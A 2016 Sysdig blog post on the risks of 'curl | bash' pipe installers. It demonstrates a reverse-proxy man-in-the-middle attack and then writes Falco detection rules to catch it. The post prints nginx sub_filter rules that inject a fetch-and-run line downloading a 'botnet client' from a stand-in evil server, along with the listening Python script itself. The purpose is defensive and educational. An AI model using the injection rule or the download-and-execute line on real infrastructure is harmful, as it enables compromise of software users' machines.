---
ID: 2675
post_title: 'Friends don&#8217;t let friends Curl | Bash'
author: Mark Stemm
post_excerpt: ""
layout: post
permalink: >
  https://sysdigrp2rs.wpengine.com/blog/friends-dont-let-friends-curl-bash/
published: true
post_date: 2016-06-13 12:47:12
---
You know those software installation instructions that tell you to download and run a script directly from the internet, as root, using something like the following?

<pre>curl https://some-url | bash </pre>

Let's call them "pipe installers".

Lots of people suggest doing this, including us at Sysdig for our own software. 

Are you a little scared by that? Do you ever think "Hm, I should really check what's in that script first before I run it?" Yeah, me too. Do you **really** download the script first and take a careful look at the script, each time, before running it? Yeah, I don't either.



In this post, we'll discuss one potential man-in-the-middle (mitm) attack against pipe installers, showing how they could be hijacked to run malicious software. Then we'll show how Sysdig Falco - an open source behavioral security monitor - can provide a level of protection to limit the activities that pipe installers can perform.



### Pipe installers vs package management systems



Most of the time, pipe installers are pretty simple--they end up calling some underlying package management software like rpm/yum, dpkg/apt-get, etc. to actually perform the installation, perhaps with an initial step to set up a custom repository or public key.



In turn, a part of installing the packages typically involves running scripts, so in a sense it's just like the pipe installer, with the ability to run arbitrary scripts as root. However, the underlying package management systems also have strong protections against tampering, including cryptographic signing and checksumming of the individual software packages. If you wanted to do your own offline verification and auditing of the packages and their scripts, you certainly could.



However, the pipe installer itself usually doesn't have that level of protection. You're relying on transport-level security as you download the installer, and the script itself isn't signed or checksummed.



When https is used (the only sane option), it provides additional safeguards against the script being modified during transport. However, there are still some possible attacks against a software vendor's server infrastructure that could allow an attacker to inject arbitrary code into the pipe installer and run it on the client system. And since these scripts are generally run as root or within a sudo session, the consequences of an exploit are very severe.



Let's talk about one possible attack now.



### Architecture of an attack



Let's assume the following architecture:



*   Build servers that create and sign the rpm, dpkg, etc. software packages.
*   A web server serving a legitimate copy of the pipe installer.
*   A reverse proxy that normally performs load balancing, caching, ssl termination, etc, using [nginx][1].
*   A "evil" web server owned by the attacker containing botnet client software.



It's probably very difficult for an attacker to gain access to the build servers, as those are typically well behind firewalls and have limited access, etc. An attacker might be able to gain access to the web server serving the pipe installer, but it would be fairly easy to check the contents of the web server and make sure it's the same as known good versions.



However, what happens if an attacker can gain access to the reverse proxy? The reverse proxy is thought of as stateless, simply offloading work from the web servers containing the real software, documentation, etc. That makes it an especially attractive target, as it's possible that an intrusion might not be detected for quite a while.



Assuming an attacker could gain access to the reverse proxy, let's show what they could do, using some simple nginx rewrite rules.



### How nginx modifies the installation script



Let's look at the nginx rules that modify the installation script. These were added by the attacker after they compromised the proxy:



<pre>location / {
    # ---BEGIN added by attacker
    sub_filter_types '*';
    sub_filter 'function install_deb {' 'curl -so ./botnet_client.py http://localhost:9090/botnet_client.py && python ./botnet_client.py &\nfunction install_deb {';
    # ---END added by attacker

    sub_filter_once off;
    proxy_pass http://apache:80;
 }</pre>



The attacker added a filter to nginx that modifies the contents of the shell script on the fly, prepending a line that downloads the botnet client from the "evil" web server and runs it.



From the software vendor's perspective, the downloads look normal, with fetches of the installation script from the web servers and work being offloaded by the reverse proxy. From the client's perspective, one extra download will probably be missed in the middle of all the other installation activity.



Once an attacker has the ability to run arbitrary software as root on a client's machine, they could do lots of evil things. Just to keep things concrete, let's look at one particular bad thing they could do, just to lead into the falco part of the discussion.



### What the botnet client script does



Here's what the botnet client script does:



<pre>python
import socket;
import signal;
import os;

os.close(0);
os.close(1);
os.close(2);

signal.signal(signal.SIGINT,signal.SIG_IGN);
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind(('0.0.0.0', 1234))
serversocket.listen(5);
while 1:
    (clientsocket, address) = serversocket.accept();
    clientsocket.send('Waiting for botnet command and control commands...\n');
    command = clientsocket.recv(1024)
    clientsocket.send('Ok, will execute "{}"\n'.format(command.strip()))
    clientsocket.close()</pre>



This script is very basic, simply closing stdin/stdout, ignoring SIGINT, and setting up a server listening on port 1234 for connections. At this point the attacker has remote root access to the client's machine, from which they can do all kinds of bad things.



### Caveats



You might be saying "well, the software vendor should just not have the reverse proxy, or should make sure it can't be compromised". You might also be saying "wow that botnet client looks pretty simplistic. Maybe it would be pulling down additional software instead of starting network servers, or installing its own packages, or doing other things instead".



Luckily, this blog post is about showing what falco can do and not the strengths/weaknesses of this particular attack and exploit, so we'll keep going.



### Creating a safer installer using Sysdig Falco



We recently released Sysdig Falco, an open source, behavioral activity monitor designed to detect anomalous activity in applications. Powered by sysdig’s system call capture infrastructure, falco lets you continuously monitor and detect container, application, host, and network activity and write rules that detect suspicious behavior.



We’ll use falco to monitor the pipe installer process and its children and flag suspicious activity. This consists of two steps:



1.  Instead of running the install script with bash, we'll run a new program <tt>fbash</tt> (falco-safe bash) which is identical to bash but starts a new [session][2] with itself as the session leader.
2.  falco will closely examine the system calls performed by the processes of <tt>fbash</tt>'s session and send notifications if any perform suspect activity such as modifying system files, starting servers, etc.



The protection falco provides has a few different layers:



*   There are certain activities that should never occur, in any context, regardless of whether or not new software is being installed. Falco provides rules that detect this malicious activity and logs notifications at a WARNING level.
*   There are certain activities that should **only** occur when new software is being installed. These activities are logged at a WARNING level when software installation is not being performed, and at an INFO level otherwise.
*   There are some activities that should **never** occur when new software is being installed. These activities are logged at a WARNING level.



The use of <tt>fbash</tt> allows us to define a *scope* upon which we can apply granular policies and differentiate between programs run by pipe installers as compared to general programs run as root/sudo.



Let's show some example rules for each of these layers. Each of the examples below use falco’s [rules format][3].



### Activities that should never occur



<pre># Only let rpm-related programs write to the rpm database
- rule: write_rpm_database
  desc: an attempt to write to the rpm database by any non-rpm related program
  condition: open_write and not rpm_mgmt_programs and fd.directory=/var/lib/rpm
  output: "Rpm database opened for writing by a non-rpm program (command=%proc.cmdline file=%fd.name)"
  priority: WARNING</pre>

This rule ensures that only rpm-related programs modify files below the rpm database in <tt>/var/lib/rpm</tt>. <tt>open_write</tt> and <tt>rpm_mgmt_programs</tt> are macros, which we discussed in our [last blog post][4]. 

This prevents malicious code run in pipe installers from modifying the set of installed programs without going through known programs that perform signature/checksum validation as a part of installing software.



### Activities that can occur during installation, but not generally



<pre># General use of system management programs results in a warning
- rule: manages_service
  desc: an attempt by a program not in a pipe installer session to manage a system service (systemd/chkconfig)
  condition: evt.type=execve and proc.name in (chkconfig, systemctl) and not proc.sname=fbash
  output: "Service management program run by process outside a fbash session (command=%proc.cmdline)"
  priority: WARNING</pre>



<pre># Within a fbash session, the severity is lowered to INFO
- rule: installer_bash_manages_service
  desc: an attempt by a program in a pipe installer session to manage a system service (systemd/chkconfig)
  condition: evt.type=execve and proc.name in (chkconfig, systemctl) and proc.sname=fbash
  output: "Service management program run by process in a fbash session (command=%proc.cmdline)"
  priority: INFO</pre>



The key filter comparison in the above rules is <tt>proc.sname=fbash</tt>. While falco is running, it's monitoring the session id of all running processes and mapping the session id back to the name of the session leader for that session. Since we started the pipe installer in a separate session and gave it the special name <tt>fbash</tt>, it's a way to identify all the processes run by the pipe installer, its children, etc.



Use of fbash allows us to generally allow service management tasks when a user is knowingly installing software, but log warnings otherwise.



### Activities that should never occur during installation



Now let's get back to the specific activities performed by the malicious software injected into the pipe installer:



<pre>- rule: installer_bash_starts_network_server
  desc: an attempt by any program that is in a session led by fbash to start listening for network connections
  condition: evt.type=listen and proc.sname=fbash
  output: "Unexpected listen call by a process in a session led by fbash (command=%proc.cmdline)"
  priority: WARNING</pre>



<pre>- rule: installer_bash_starts_session
  desc: an attempt by any program that is in a session led by fbash to start a new session
  condition: evt.type=setsid and proc.sname=fbash
  output: "Unexpected setsid call by a process in a session led by fbash (command=%proc.cmdline)"
  priority: WARNING</pre>



The first rule detects the main thing the botnet client script does, calling <tt>listen()</tt> to start a server listening for network connections. Although it's reasonable to expect services to act as servers, it's **not** expected that this should occur while running an installation script. That's why we raise a warning.



The second rule ensures that programs can't escape the monitored session by calling <tt>setsid()</tt> to create their own session.



### Conclusion



We've shown one possible weakness of pipe installers--relying on transport level security--and how that weakness can be exploited by attacking one components of a software vendor's server infrastructure to allow for arbitrary code execution.



We've also shown how sysdig falco can define a scope upon which you can apply a policy to limit the actions taken by pipe installers, providing an additional level of protection against these attacks.



Now go [download][5] falco and start using it for yourself!



P.S. If you'd like to see all of this in action, we've got everything set up in a [docker-compose][6] environment. The installation instructions are [here][7].

 [1]: http://nginx.org/en/
 [2]: https://en.wikipedia.org/wiki/Process_group
 [3]: https://github.com/draios/falco/wiki/Falco%20Rules
 [4]: https://sysdigrp2rs.wpengine.com/blog/sysdig-falco/
 [5]: http://www.sysdig.org/falco/
 [6]: https://docs.docker.com/compose/
 [7]: https://github.com/draios/falco/tree/dev/examples/mitm-sh-installer